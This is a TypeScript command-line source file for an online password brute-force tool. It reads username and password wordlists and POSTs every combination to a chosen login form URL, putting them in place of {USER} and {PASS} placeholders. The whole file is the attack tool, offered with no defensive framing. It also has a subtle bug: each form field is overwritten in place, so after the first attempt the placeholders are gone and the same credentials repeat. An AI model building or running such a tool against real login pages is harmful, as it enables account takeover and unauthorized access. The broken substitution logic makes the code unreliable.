import { parse } from "ts-command-line-args";
import * as fs from "fs";
import * as readline from "readline";

interface Arguments {
  userFile: string; // user list file path
  passFile: string; // password file path
  target: string; // url to stomp
  formFields: string[]; // form data to send, of form key:value
}

export const { userFile, passFile, target, formFields } = parse<Arguments>({
  userFile: { type: String, alias: "u" },
  passFile: { type: String, alias: "p" },
  target: { type: String, alias: "t" },
  formFields: { type: String, multiple: true, alias: "f" },
});

type Meta = {
  users: string[];
  passwords: string[];
};

type FormObject = {
  key: string;
  value: string;
};

const meta: Meta = {
  users: [],
  passwords: [],
};

async function processLineByLine(fileName: string, arrayRef: string[]) {
  const fileStream = fs.createReadStream(fileName);

  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity,
  });
  // Note: we use the crlfDelay option to recognize all instances of CR LF
  // ('\r\n') in input.txt as a single line break.

  for await (const line of rl) {
    // Each line in input.txt will be successively available here as `line`.
    if (line !== "") {
      arrayRef.push(line);
    }
  }
}

await processLineByLine(userFile, meta.users);
await processLineByLine(passFile, meta.passwords);

// Convert formFields to keyValue pairs
const getFormObject = (formField: string): FormObject => {
  const [key, value] = formField.split(":");
  return { key, value };
};

const formObjects = formFields.map((formField) => getFormObject(formField));

const post = async (target: string, formObjects: FormObject[]) => {
  const data = new URLSearchParams();

  formObjects.forEach((formObject) => {
    const { key, value } = formObject;
    data.append(key, value);
  });

  const response = await fetch(target, {
    method: "POST", // *GET, POST, PUT, DELETE, etc.
    mode: "cors", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "omit", // include, *same-origin, omit
    headers: {
      // "Content-Type": "application/json",
      "Content-Type": "application/x-www-form-urlencoded",
    },
    redirect: "follow", // manual, *follow, error
    referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: data, // body data type must match "Content-Type" header
  });

  return response.json(); // parses JSON response into native JavaScript objects
};

const { users, passwords } = meta;

console.log(users, passwords);

users.forEach((user) => {
  passwords.forEach((password) => {
    const replacedFormObjects = formObjects.map((formObject) => {
      formObject.value = formObject.value
        .replace("{USER}", user)
        .replace("{PASS}", password);

      return formObject;
    });
    console.log(replacedFormObjects);
    post(target, replacedFormObjects)
      .then((result) => console.log(result))
      .catch((e) => console.log(e));
  });
});
